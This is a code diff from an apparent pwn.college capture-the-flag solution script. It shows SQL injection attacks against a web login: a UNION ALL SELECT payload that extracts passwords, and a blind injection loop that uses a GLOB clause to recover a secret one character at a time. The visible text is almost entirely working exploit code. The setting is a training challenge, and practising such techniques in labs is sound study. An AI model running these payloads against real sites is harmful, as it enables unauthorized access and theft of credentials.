@@ -30,26 +30,26 @@ def lv_6():
     get_GET_result(args = '?query=%" UNION ALL SELECT password FROM ' + table_name + '; --')
 
 def lv_7():
-    flag_prefix = 'pwn.college{'
+    flag_prefix = ''
     while(True):
-        break_while = True
-        for i in range(1, 128):
-            ch = chr(i)
-            if(ch == '%'):
+        ch = ''
+        for i in range(32, 127):
+            ch = struct.pack("B", i).decode('utf-8')
+            if(ch == '*' or ch == '?'):
                 continue
             cur_prefix = flag_prefix + ch
             data = {
-                'username': 'no" UNION ALL SELECT rowid, rowid, rowid FROM users WHERE password LIKE "' + cur_prefix + '%"; --',
+                'username': 'flag" AND password GLOB "' + cur_prefix + '*"; --',
                 'password': '123'
             }
             res = get_POST_result(data = data, print_out = False)
             if('Hello' in res):
                 flag_prefix = cur_prefix
                 print(flag_prefix)
-                break_while = False
                 break
-        if(break_while):
+            if(i == 126):
+                flag_prefix = flag_prefix + '?'
+                print(flag_prefix)
+                break
+        if(ch == '}'):
             break
-    if(flag_prefix[-1] != '}'):
-        flag_prefix = flag_prefix + '}'
-    print(flag_prefix)
